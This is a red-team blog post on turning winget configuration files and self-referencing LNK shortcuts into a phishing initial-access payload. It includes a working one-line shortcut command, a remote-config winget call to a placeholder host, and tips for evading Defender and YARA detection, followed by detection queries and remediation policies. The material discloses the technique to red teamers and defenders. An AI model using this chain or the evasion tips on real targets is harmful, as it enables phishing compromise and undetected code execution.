# https://blog.compass-security.com/2026/03/winget-desired-state-initial-access-established/

# [WinGet Desired State: Initial Access Established](https://blog.compass-security.com/2026/03/winget-desired-state-initial-access-established/ "WinGet Desired State: Initial Access Established")

[March 3, 2026](https://blog.compass-security.com/2026/03/winget-desired-state-initial-access-established/ "WinGet Desired State: Initial Access Established") / [Marc Tanner](https://blog.compass-security.com/author/mtanner/) / [0 Comments](https://blog.compass-security.com/2026/03/winget-desired-state-initial-access-established/#respond)

> TL;DR: While not new, a self-referencing LNK file in combination with winget configuration instructions can be a viable initial access payload for environments where the Microsoft Store is not disabled.

When tasked to design a payload for an initial access scenario for a [red teaming project](https://www.compass-security.com/en/services/red-teaming), we typically look for inspiration in:

- Associated file extensions
- Registered protocol handlers
- Black lists used by popular applications such as [Microsoft Edge](https://learn.microsoft.com/en-us/deployedge/microsoft-edge-security-downloads-interruptions) and [Outlook](https://support.microsoft.com/en-us/office/blocked-attachments-in-outlook-434752e1-02d3-4e90-9124-8b81e49a8519#ID0EFF)
- Known [abused file types](https://filesec.io/) by threat actors

That is when my colleague Sylvain noticed the `.winget` extension mapped to the following command, allowing easy execution with a double click:

```
winget.exe configure "%1" --wait
```

While the [abuse potential of winget](https://www.zerosalarium.com/2024/12/LOLBIN%20WinGet%20execute%20PowerShell%20script.html) is not new, it seems to be largely neglected by the defensive security community. This is also indicated by its absence from the aforementioned dangerous file block lists. A reason might be that the legitimate functionality is actively [promoted by Microsoft](https://learn.microsoft.com/en-us/dotnet/core/tutorials/with-visual-studio-code?pivots=vscode#installation-instructions) to install e.g., developer dependencies in a streamlined way:

[![](https://blog.compass-security.com/wp-content/uploads/2026/02/winget-initial-access-ms-instructions-1024x410.png)](https://blog.compass-security.com/wp-content/uploads/2026/02/winget-initial-access-ms-instructions.png) [Microsoft instruction to install developer dependencies](https://learn.microsoft.com/en-us/dotnet/core/tutorials/with-visual-studio-code?pivots=vscode#installation-instructions)

From an offensive security perspective it is convenient that the Mark of the Web (MoTW) is not taken into consideration and no [SmartScreen](https://learn.microsoft.com/en-us/windows/security/operating-system-security/virus-and-threat-protection/microsoft-defender-smartscreen/) integration seems to exist.

## Quick Introduction

So what is the [winget configuration functionality](https://learn.microsoft.com/en-us/windows/package-manager/configuration/)? It is built upon [(PowerShell) Desired State Configuration (DSC)](https://learn.microsoft.com/en-us/powershell/dsc/overview) a declarative system configuration management platform. If you are familiar with Ansible, similar concepts apply where individual, ideally idempotent, configuration steps should result in a consistent system state.

The configure component requires extended features, which if needed, can be enabled from a low-privileged user context with:

```
winget configure --enable
```

The [default resources](https://learn.microsoft.com/en-us/powershell/dsc/reference/psdscresources/overview?view=dsc-2.0#resources) facilitate access to environment variables and the registry, support archive extraction and process creation as well as PowerShell script execution. More than enough functionality to [phish for persistence](https://medium.com/@matterpreter/hang-fire-challenging-our-mental-model-of-initial-access-513c71878767) using one of the [numerous techniques](https://www.hexacorn.com/blog/2017/01/28/beyond-good-ol-run-key-all-parts/). As a basic example the following configuration file downloads and runs Sysinternals’ Process Explorer:

Plain text

Copy to clipboard

Open code in new window

EnlighterJS 3 Syntax Highlighter

properties:

configurationVersion: 0.2.0

resources:

\- resource: PSDscResources/Script

directives:

description: Download ProcessExplorer.zip from remote URL

settings:

SetScript: "Invoke-WebRequest -Uri 'https://download.sysinternals.com/files/ProcessExplorer.zip' -OutFile 'C:\\\Windows\\\Temp\\\ProcessExplorer.zip' -UseBasicParsing"

GetScript: $false

TestScript: $false

\- resource: PSDscResources/Archive

directives:

description: Extract ProcessExplorer.zip

settings:

Path: C:\\Windows\\Temp\\ProcessExplorer.zip

Destination: C:\\Windows\\Temp\\Extracted

Ensure: Present

\- resource: PSDscResources/WindowsProcess

directives:

description: Run ProcessExplorer.exe from extracted archive

settings:

Path: C:\\Windows\\Temp\\Extracted\\procexp64.exe

Arguments: "-accepteula"

properties:
configurationVersion: 0.2.0
resources:
\- resource: PSDscResources/Script
directives:
description: Download ProcessExplorer.zip from remote URL
settings:
SetScript: "Invoke-WebRequest -Uri 'https://download.sysinternals.com/files/ProcessExplorer.zip' -OutFile 'C:\\\Windows\\\Temp\\\ProcessExplorer.zip' -UseBasicParsing"
GetScript: $false
TestScript: $false
\- resource: PSDscResources/Archive
directives:
description: Extract ProcessExplorer.zip
settings:
Path: C:\\Windows\\Temp\\ProcessExplorer.zip
Destination: C:\\Windows\\Temp\\Extracted
Ensure: Present
\- resource: PSDscResources/WindowsProcess
directives:
description: Run ProcessExplorer.exe from extracted archive
settings:
Path: C:\\Windows\\Temp\\Extracted\\procexp64.exe
Arguments: "-accepteula"

```
properties:
  configurationVersion: 0.2.0
  resources:
    - resource: PSDscResources/Script
      directives:
        description: Download ProcessExplorer.zip from remote URL
      settings:
        SetScript: "Invoke-WebRequest -Uri 'https://download.sysinternals.com/files/ProcessExplorer.zip' -OutFile 'C:\\Windows\\Temp\\ProcessExplorer.zip' -UseBasicParsing"
        GetScript: $false
        TestScript: $false
    - resource: PSDscResources/Archive
      directives:
        description: Extract ProcessExplorer.zip
      settings:
        Path: C:\Windows\Temp\ProcessExplorer.zip
        Destination: C:\Windows\Temp\Extracted
        Ensure: Present
    - resource: PSDscResources/WindowsProcess
      directives:
        description: Run ProcessExplorer.exe from extracted archive
      settings:
        Path: C:\Windows\Temp\Extracted\procexp64.exe
        Arguments: "-accepteula"
```

From an offensive security perspective winget is a nice proxy for PowerShell execution using legitimate system functionality intended for configuration tasks. The underlying system changes are performed by the `ConfigurationRemotingServer.exe` process. This has some similarities to scripts being deployed using SCCM where they are executed through `CcmExec.exe` and often less scrutinized. If needed, all referenced PowerShell resources are automatically downloaded from the [PowerShell Gallery](https://www.powershellgallery.com/packages?q=Tags%3A%22DSC%22) and stored in `%LOCALAPPDATA%\Microsoft\WinGet\Configuration\Modules`.

From an end-user point of view double clicking such a `.winget` file looks as follows:

[![](https://blog.compass-security.com/wp-content/uploads/2026/02/winget-double-click-confirmed2-1024x966.png)](https://blog.compass-security.com/wp-content/uploads/2026/02/winget-double-click-confirmed2.png) Standard behavior when opening a `.winget` file.

When attempting to convince a phishing target to execute such a payload, there are a number of undesirable properties:

- The user has to explicitly confirm the installation by entering `Y` (or `y`, case does not matter)
- There is lots of confusing text being displayed
- Due to the `--wait` command line option, the console application remains open after execution

## Reducing Required User Interaction

Explicit user input can be avoided by either:

- Launching winget with the option `--accept-configuration-agreements`
- Supplying the required confirmation input in some other form e.g., `echo y | winget ...`

The output can be suppressed by redirecting it to `>nul`.

All these options require direct control of the winget invocation which means the configuration file can no longer be used on its own, but needs to be applied through some trigger file. The most obvious approach is to use a LNK shortcut. This replaces the need for interactive keyboard input with an additional MoTW related security warning dialog which end users are hopefully more likely to accept. Because winget also applies configurations hosted on web servers, the first attempt was to use a shortcut executing:

```
winget configure https://yourhost.tld/burpisnotbeef.yml --accept-configuration-agreements
```

While the LNK contained within a ZIP archive could be delivered to the endpoint through HTML smuggling, subsequent execution failed.

At this point we decided to try a technique discussed by Emeric Nasi in his Offensive X talk [Breach The Gate: Advanced Initial Access Craft 2024](https://www.youtube.com/watch?v=bA2p27gQK4M):

[![](https://blog.compass-security.com/wp-content/uploads/2026/02/initial-access-lnk-self-referencing-1024x576.png)](https://blog.compass-security.com/wp-content/uploads/2026/02/initial-access-lnk-self-referencing-scaled.png) Self-referencing LNK, [Slides](https://github.com/sevagas/Advanced_Initial_access_in_2024_OffensiveX/blob/main/breach_the_gates_extended.pdf)

The idea is to craft a LNK shortcut which:

1. Locates itself
2. Extracts the appended winget configuration data using [`more`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/more)
3. Shows a decoy document to distract the user
4. Executes winget with the required options in the background

To locate the delivered LNK file, we assume that the user either extracted the ZIP archive in the downloads folder or simply opened the archive. In the latter case Windows extracts the selected file to a temporary directory such as: `%TMP%\2af79810-65c9-4d8d-8a63-5f003ab362c8_update.zip.2c8\update.lnk`.

Combining steps 1-4 from the above list, results in a shortcut like:

```
C:\Windows\system32\cmd.exe /c "(cd %TMP%\*update.zip* || cd %HOMEPATH%\Downloads\update) & (more +1349 *.lnk > %TMP%\conf.yml) && start https://yourhost.tld/decoy.pdf & winget configure --enable & (echo Y | winget configure -f %TMP%\conf.yml >nul)"
```

At this point I thought there is no chance that this would fly past a modern EDR.

![](https://blog.compass-security.com/wp-content/uploads/2026/02/initial-access-meme-not-stupid.png) Predicting how modern EDR systems react is hard

For Microsoft Defender for Endpoint (MDE) it seems to be important that the size of the LNK file as a whole i.e., with the appended data is kept as small as possible. Otherwise alerts such as the one below are generated:

![](https://blog.compass-security.com/wp-content/uploads/2026/02/initial-access-mde-alert-lnk.png) MDE does not seem to like large LNK files

Some practical tips from my limited experience:

- Keep the shortcut command line as short as possible, do not exceed ~250 characters
- Instead of `winget configure` use the alias `winget dsc`
- The file extension does not matter: instead of `.winget` just use `.yml` or omit it completely
- To speed up the configuration process use a single PowerShell script resource
- Use commands that map to compiled .NET cmdlets or use APIs such as `[System.IO.Compression.ZipFile]::ExtractToDirectory` instead of `Expand-Archive` to avoid the creation of an additional `powershell.exe` process
- Avoid double file extensions like `.pdf.lnk`
- If you encounter an issue on system where extended features are not enabled, add a small delay using e.g. `timeout /t 1`
- If you face a brittle detection on the `echo Y | ...` construct, use something else like `echo y > x & type x | ...` or apply slight [DOSfuscation](https://services.google.com/fh/files/misc/exploring-the-depths-of-cmd-exe-obfuscation-wp-en.pdf)
- Check that your payload does not match common [LNK related YARA rules](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_susp_lnk_files.yar)
- Add more benign files in nested folder structures of the delivered ZIP file
- If you are using the standalone winget approach, pad the first 5 lines of your PowerShell script in the configuration file with comments matching your pre-text

The source code for the [legacy PowerShell script resource](https://github.com/PowerShell/PSDscResources/blob/master/DscResources/MSFT_ScriptResource/MSFT_ScriptResource.psm1), newer class-based [DSC resources](https://github.com/microsoft/winget-dsc/tree/main/resources), the core [PSDesiredStateConfiguration module](https://github.com/PowerShell/PSDesiredStateConfiguration) as well as the [winget utility](https://github.com/microsoft/winget-cli/blob/HEAD/src/AppInstallerCLICore/Commands/ConfigureCommand.cpp) itself is available on GitHub for further inspection. For example, revealing that `System.Management.Automation` is used for the PowerShell execution, meaning your script will be passed through AMSI.

End user experience on a system with extended features already enabled. The winget command runs in the background within a minimized console window.

This technique can also be combined with other [LNK related tradecraft](https://www.wietzebeukema.nl/blog/trust-me-im-a-shortcut) to hide the executed commands from a curious user when inspecting the shortcut properties.

## Detection

To check whether the feature is (ab)used in your environment you can try to run the following KQL query which lists all winget configure invocations. It is important that the substring matching is performed case insensitively:

```
DeviceProcessEvents
| where FileName =~ "winget.exe"
| where ProcessCommandLine has_any ("configure", "configuration", "dsc")
```

On affected machines applied configurations and their origin can be listed with:

```
winget configure list
```

Furthermore, winget logs all performed invocations in a directory opened by `winget --logs`. By default the execution time and the used command line arguments are recorded. If the [logging verbosity](https://github.com/microsoft/winget-cli/blob/master/doc/Settings.md#logging) is increased through the configuration file opened by `winget settings`, the complete configuration instructions and execution of individual steps are also logged.

## Remediation

Assuming the winget functionality is not needed at all, the attack surface can be mitigated by disabling the [complete Microsoft Store](https://learn.microsoft.com/en-us/windows/configuration/store/) or more specifically the Windows Package Manager (winget) through the [`EnableAppInstaller` policy](https://learn.microsoft.com/en-us/windows/client-management/mdm/policy-csp-desktopappinstaller#enableappinstaller). General application whitelisting solutions such as Windows Defender Application Control (WDAC) provide another way to prevent execution.

If the Windows package manager is needed, the configuration sub command described in this blog can be individually disabled with the [`EnableWindowsPackageManagerConfiguration`](https://learn.microsoft.com/en-us/windows/client-management/mdm/policy-csp-desktopappinstaller#enablewindowspackagemanagerconfiguration) policy directive.

[![](https://blog.compass-security.com/wp-content/uploads/2026/02/winget-initial-access-remediation-1024x351.png)](https://blog.compass-security.com/wp-content/uploads/2026/02/winget-initial-access-remediation.png) Different error modes depending on whether the store application, the package manager (winget) or its configuration feature is disabled.

If for whatever reason this is not possible, then consider to at least remove the `.winget` file association. While this does not prevent the LNK shenanigans, it removes the possibility to execute configuration files by simple double clicking them, thereby increasing the required social engineering effort.

## Conclusion

We presented a viable initial access payload by chaining two known techniques: winget as a living off the land binary to invoke PowerShell scripts and self-referencing Windows shortcuts as a combined delivery and execution mechanism.

Whenever possible defenders should reduce the attack surface of their systems by disabling unused Windows components and features such as the Microsoft Store, the Windows Package Manager (winget) or its configuration feature.

[Evasion](https://blog.compass-security.com/category/evasion/), [Red Teaming](https://blog.compass-security.com/category/red-teaming/), [Windows](https://blog.compass-security.com/category/windows/)

[Initial Access](https://blog.compass-security.com/tag/initial-access/) [phishing](https://blog.compass-security.com/tag/phishing/)

[**Previous post**\\
From Folder Deletion to Admin: Lenovo Vantage (CVE‑2025‑13154)](https://blog.compass-security.com/2026/02/from-folder-deletion-to-admin-lenovo-vantage-cve-2025-13154/ "Previous post: From Folder Deletion to Admin: Lenovo Vantage (CVE‑2025‑13154)") [**Next post**\\
From Enumeration to Findings: The Security Findings Report in EntraFalcon](https://blog.compass-security.com/2026/03/from-enumeration-to-findings-the-security-findings-report-in-entrafalcon/ "Next post: From Enumeration to Findings: The Security Findings Report in EntraFalcon")

### Leave a Reply [Cancel reply](https://blog.compass-security.com/2026/03/winget-desired-state-initial-access-established/\#respond)

Your email address will not be published.Required fields are marked \*

Comment \*

Name \*

Email \*

© 2026 [Compass Security Blog](https://blog.compass-security.com/ "Compass Security Blog")

Up ↑